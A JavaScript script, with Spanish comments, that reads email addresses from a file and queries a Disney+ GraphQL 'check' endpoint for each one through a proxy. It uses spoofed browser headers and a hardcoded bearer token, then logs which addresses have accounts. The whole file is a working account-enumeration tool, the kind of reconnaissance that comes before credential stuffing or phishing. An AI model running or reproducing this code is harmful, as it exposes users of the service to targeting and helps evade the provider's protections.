import fs from "fs";
import { HttpsProxyAgent } from "https-proxy-agent";


// Leer emails desde archivo txt
function leerEmailsDesdeArchivo(ruta) {
    try {
        const contenido = fs.readFileSync(ruta, "utf8");
        // Filtrar líneas vacías y espacios
        return contenido.split("\n").map(line => line.trim()).filter(line => line.length > 0);
    } catch (error) {
        console.error("❌ Error leyendo archivo de emails:", error.message);
        return [];
    }
}

// Cargar emails desde el archivo
const emailsALeer = leerEmailsDesdeArchivo("./emails2.txt");

if (emailsALeer.length === 0) {
    console.log("No se encontraron emails para procesar. Asegúrate de crear el archivo 'emails.txt' con un email por línea.");
    process.exit(1);
}

console.log(`Se encontraron ${emailsALeer.length} emails para procesar.\n`);

var TOKEN = "Bearer eyJ6aXAiOiJERUYiLCJraWQiOiJ0Vy10M2ZQUTJEN2Q0YlBWTU1rSkd4dkJlZ0ZXQkdXek5KcFFtOGRJMWYwIiwiY3R5IjoiSldUIiwiZW5jIjoiQzIwUCIsImFsZyI6ImRpciJ9..tb2X8bStjF_2DE95.SVqKb-YzwU8Zdff1zk2LdinqIVl7RBBmJmfXG7nrGfjQvpPcGEPfOwboj62vFRgJBdXTznobS0rnt3zaDUASbx2E_bBaKN8DP4tG-Dyd4p6yB42EBucZsfYedkI9dhOg-OyU3DPH_cBez0PRmxZqpTzvTNnVqtje5HPw2uhynTf69gn6m3SkmZ95uR8aznhwOnRIDpu8GRIU98xbnL4WAmIgsVeY2L0ISBJ0Z4eGJxiSkNumhxaKKoIB9bI_NWAwwGb7RvBkI1FXVhVBUaCGLZnuxz3Y8RXVnzGTbUZwo3o8NxrMuxY19ZVStSDQ47pDcnJxrxoOKEqOha7RbcEAl7uxKtCXzHDtryBO3VPoh8k_5Txp4t-GYS2qbiGqZzkz_fc815QgCXY9pisQc97qTvPkom6xSVV_Os9zR4xjQp07B5BxeUUplM03PEqFx4dtCOhMo_IH1vJhSLn6BRBPzcQH9g3b1Ww7kUOxjpFTagRxZFY4rTXd10hQSgVQIoGJsqe2eQ6V_5p4JNnGcA7Ycs7PPiZRVC4i_ggnf53ME2n158S7c2cUEwALU6xRydRYLxjvUaPjEhusG2xNK3TsU0K2wiWryMJrrxN8GA1zJxn4ShelsxjOxAP_2athgUZ9ThT01yKWM1dREMTgXXgGVuG6OAOv0Hzt5o3iPpwru1UugBXdm_1guCUMctOBeLlA6fHPCYapl-28IzDuAChjjTMm9gcT_sq9ofGdYsF6n9RgTpxo3B-4uIwh9L_5fSK-7S6WVnL6GTFs-ncpvZsIZ-p_PhKpZyFRSh7e_mrpHJKMA5JFETE110vV0Op2owgZQcdr4Py7cxtKwYPb0K4vGEz2skbhaVEbx5gnoONldomqm8U670EVT6mxDjfuhT0qPzKXFYNc1pJhBgOA8lcchGfV733w6LxEB_oUjWXCjsGagxhONO57YpT3U4kb0X67pXc9gg6Nq5X7P5Eev3cEEpIiEN4NOijzVB0wwXZjtfrbyMlQe4lW1I64wtDJj9-xZk6NISsfyprwL5onwC9tKFyAYdqnxeAoCRSbNKXXCCAa8sMbObmgsULLZr5YNwmv9C5yCziQOQ_9uB809wuxwpDI0RYZVwayERx7DjCak0iG4hCcuhcmUaXUxex01TCActqWrnxUSLDJlKLnkfqxGEeF8Uaff9wtAiTwj-XBhljrQ8qYUFEZfXbJAigN2kDDJbRqb9t1LpBP3WbtVwaLqCAgnuUqX-3iN8DOBK5vhkyZQjWDK1yhPUgxa50aVzoAzrflqhImlLQUYX1sngdaYmSYKT2Bh70LuCsWhOCXsruqaVrixpwoX5uIsnD37aJZcV4tP6hh8LuTbEe32IzGLgZtS8-OTQ7WLy1dMD5vMmgj5pZZzWQFlo_asrvo777zyxrUqi82_uKk8SRZjdxk_ys9mzn_4pYrLHtgI2_AnWQNc75DKU-hLHV-QlRKxdQcLJEWraSvl8vQ-jSxmvcTNUy9wb42ik_cb7Zwg2hj3ffBTteLX1Ajx6tmKfFbWu5OHfSXL0OSGQFPH49SqU0v6XfkekUGbhIYiNIPJLAx-8abELyI5LZ1GmW1wHKdtsvFMYfO5IMioHhAIuZz0L6dci_cqulgRcsaJEZi3BiT9MFKEq0CxeFggrcywhOUIKNhgW1uopXDLrG6Kkyg_IheeRPyvtVA3nPBH957L9ih99x1yrgel_6XNX5L5Z2oo7W5V-nBMvDYO6iO6jzeAdcyTRvhB8TQv33wYoKNYS2rhFTwrjl8cLOcGcdqDFuFIfKf_XdWx_otwQOmQY7dUdDiLiSkzM8ITWf67s3NncIg5ApYkU5hmUBm67FVMzB9B1QkVn18LsSrNbn-HYVSF-BwtDl6IHcVU-PQ5DwpG0eZogMj8K__JP7s_k5HMPD0W9rLFF6fc_uxm_18iRvrLUZNSRTt2p_WjW6mkPyWekmNo-XRjktst7S9KDumfg70VdC19tz1b3XkS8Ov2Lje6epYT7yBnqutzahnQPrqmaAAK0pdurzAVPYjv26OA3VvIITlVklVXzgH4nwx_sczNWzrbCA_ahaklpmJq74vc0SzSI8fSEN2p893yNqFkuL2tBRhoo65H7gVZ3KXuv8bN2zyWhfh62Imme18OTny1o0cpJf763P1i0xDvX3XAxhDzI_PwS04UPLs7ZqbLZAR6sob-DQZ8FJfG48jK_Au1OcBSHWsACAymvX5uPfQfQGWW5qoFTHUZOHhuiPxQJwVjj1icBa59xA_ryIyTdFKg4l5wPFt0QppaBimZlr44SNSNmJvVMbQJ_zWEjpojTKjTZ4OaduxpalfkjN0E4BxPN4e470mc6-c8rXmco02o6NnI17qUy9Z5eX3Yk2P2C2Ia2KLZPwVfHuraJxMGwVgjm4P-5LRrkFtrde1kXlzQcBRj0diPOPqITLNxfDLUTBeZQ5_08d6BM9A7CAf2gk7tnIUGdVmsm0gVDp16cDpp1im4mvbVg_8TJzqzM3I3UO27E6224Dde7CmTIjgjX-FoqTqzrDUw5FNnF685AnufoV8j5_eCQIaCvxyvioC-aRGJaTRUh7EqTVRPIYn8i-yZxNi3xY-oOV48Nj2cV7u5YnmB9GkoFKwKt_bGmZTpEOyGNWaYoQ6-vVtAKbT9OJzO3onWpdYU18ltsH8C9tl34FENWUpYLEnOIb77DZ-9fWHQXrJKvhpSKakEbIkRA.7VUJGS-c25feNo_o8CYvpQ"


const rutaArchivo = "./resultados.json";
fs.writeFileSync(rutaArchivo, "[]", "utf8");

function cargarJSON() {
    try {
        const data = fs.readFileSync(rutaArchivo, "utf8");
        return JSON.parse(data);
    } catch {
        return [];
    }
}

function guardarResultado(email, result) {
    const datos = cargarJSON();
    datos.push({
        email,
        exist: result.exist,
        noError: result.noError,
        errorMessage: result.errorMessage || null
    });
    fs.writeFileSync(rutaArchivo, JSON.stringify(datos, null, 2), "utf8");
}

// Procesar cada email del archivo
/* for (let i = 532; i >= 0; i--) { */
for (let i = 0; i < emailsALeer.length ; i++) {
    const correoFormado = emailsALeer[i];
    //console.log(correoFormado)
    if (!correoFormado.includes('@')) {
        console.log(`⚠️ Línea ${i + 1} no es un email válido: ${correoFormado}`);
        continue;
    }

    /* const proxy = "http://8.35.211.163:80";
    const agent = new HttpsProxyAgent(proxy);

    const res = await fetch("https://ipinfo.io/json", {
        agent,
        headers: {
            "User-Agent": "Mozilla/5.0"
        }
    });

    console.log(await res.json());

    break */

    var result = await checkDisneyExists(correoFormado);
    guardarResultado(correoFormado, result);

    if (result.noError) {
        if (result.exist === true) {
            console.log(correoFormado + " PERRO existeeeeeeeeeeeeeeeeeeee")
        }
        /* if (result.exist === false) {
            console.log((i + 1) + " no existe")
        } */
    }

    if (result.noError === false) {
        if (result.serverError) {
            console.error("🖥🖥🖥🖥 Error servidor: " + result.errorMessage)
        } else {
            console.log("🌐🌐🌐🌐 Error solicitud: " + result.errorMessage);
        }
    }
}

async function checkDisneyExists(email) {
    var result = {
        noError: false,
        exist: null,
        serverError: false,
        errorMessage: ""
    }

    try {

        const proxy = "http://192.168.148.68:46704";
        const agent = new HttpsProxyAgent(proxy);

        var serverResponse = await fetch("https://disney.api.edge.bamgrid.com/v1/public/graphql ", {
            "headers": {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": "\"Chromium\";v=\"142\", \"Google Chrome\";v=\"142\", \"Not_A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "x-application-version": "1.1.2",
                "x-bamsdk-client-id": "disney-svod-3d9324fc",
                "x-bamsdk-platform": "javascript/windows/chrome",
                "x-bamsdk-platform-id": "browser",
                "x-bamsdk-version": "34.1",
                "x-dss-edge-accept": "vnd.dss.edge+json; version=2",
                "x-request-id": "07f43d86-8b1e-4276-a724-4ca71801239d",
                "x-request-yp-id": "624b805dafc5c73635b1a216",
                "Referer": "https://www.disneyplus.com/ ",
                "authorization": TOKEN,
            },
            agent,
            "body": "{\"query\":\"\\n    query check($email: String!) {\\n        check(email: $email) {\\n            operations\\n            nextOperation\\n        }\\n    }\\n\",\"variables\":{\"email\":\"" + email + "\"},\"operationName\":\"check\"}",
            "method": "POST"
        })

        var jsonResponse = await serverResponse.json();
        if (jsonResponse.hasOwnProperty("errors")) {
            result.serverError = true;
            throw new Error(jsonResponse.errors[0].code);
        }

        if (jsonResponse.hasOwnProperty("data")) {
            if (jsonResponse.data.hasOwnProperty("check")) {
                if (jsonResponse.data.check.hasOwnProperty("operations")) {
                    if (jsonResponse.data.check.operations.includes("Login") || jsonResponse.data.check.operations.includes("OTP")) {
                        result.exist = true;
                        result.noError = true;
                        if (jsonResponse.data.check.operations.includes("Login")) {
                            result.login = true
                            console.log("LOGIN")
                        } else {
                            result.login = false
                        }
                    }
                    if (jsonResponse.data.check.operations.includes("Register")) {
                        result.exist = false;
                        result.noError = true;
                    }
                }
            }
        }
        if (result.exist === null) {
            throw new Error("No se pudo determinar si existe")
        }

    } catch (error) {
        result.errorMessage = error.message;
        result.noError = false;
    } finally {
        return result
    }
}